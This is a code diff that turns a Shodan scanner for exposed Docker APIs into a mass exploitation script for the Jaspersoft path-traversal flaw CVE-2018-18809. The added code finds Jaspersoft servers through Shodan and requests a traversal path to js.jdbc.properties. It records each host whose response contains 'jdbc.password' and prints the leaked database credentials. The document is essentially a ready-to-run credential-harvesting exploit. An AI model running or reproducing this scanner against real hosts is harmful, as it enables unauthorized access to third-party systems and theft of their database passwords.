@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #
-# docker.py
-# Search SHODAN for docker API's exposed
+# jaspersoft.py
+# Search SHODAN for Jaspersoft LFI CVE-2018-18809
 #
 # Author: random_robbie
 
@@ -10,40 +10,51 @@ import sys
 import re
 import requests
 from time import sleep
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOUR API KEY"
-SEARCH_FOR = 'port:2375 product:"Docker"'
-FILE = "/v1.24/containers/json"
+API_KEY = "YOURAPIKEY"
+SEARCH_FOR = 'title:"TIBCO Jaspersoft:" port:"443" 1970"'
+FILE = "/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"
 session = requests.Session()
 
 def filter_result(str):
-	return str.strip()
+	str.strip() #trim
+	str.lstrip() #ltrim
+	str.rstrip() #rtrim
+	return str
 
 def grab_file (IP,PORT,FILE):
 	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
 	try:
-		URL = "http://"+IP+":"+PORT+""+FILE+""
+		
+		URL = "https://"+IP+":"+PORT+""+FILE+""
+		
 		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
-		response = session.get(URL, headers=headers, timeout=15, verify=False)
+		response = session.get(URL, headers=headers, timeout=10, verify=False)
 		result = response.text
-		if "Image"in  result:
-			if any(re.findall(r'minergate|xmr-stak-cpu|xmrdemo|140.82.21.105|144.202.25.142|xmrigCC|proton', result, re.IGNORECASE)):
-				text_file = open("./cfg-hijacked/"+IP+"-hijacked.cfg", "a")
-				text_file.write(""+result+"\n")
-				text_file.close()
-				print ("[*] DOH! this docker server has been hijacked for XMR or DDOS. [*]\n")
-			else:
-				text_file = open("./cfg/"+IP+"-containers.cfg", "a")
-				text_file.write(""+result+"\n")
-				text_file.close()
-				print ("[*] Live Docker API Whooops.. [*]\n")
+		if 'jdbc.password' in result:
+			text_file = open("./cfg/jaspersoft.cfg", "a")
+			text_file.write("https://"+IP+":"+PORT+"\n")
+			text_file.close()
+			print ("[*] Jaspersoft LFI... Found [*]\n")
+			print (result)
+		else:
+			print ("[*] Not Vulnerable [*]\n ")
 	except KeyboardInterrupt:
-		sys.exit("Ctrl-c pressed ...")			
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+			
 	except Exception as e:
 		print (e)
 		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
+	
 
+
+
+	
+	
 try:
         # Setup the api
 		api = shodan.Shodan(API_KEY)
@@ -58,6 +69,9 @@ try:
 				CC = service['location']['country_name']
 				grab_file (IP,PORT,FILE)
 except KeyboardInterrupt:
-		sys.exit("Ctrl-c pressed ...")				
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+				
 except Exception as e:
-		sys.exit('Error: %s' % e)
+		print('Error: %s' % e)
+		sys.exit(1)
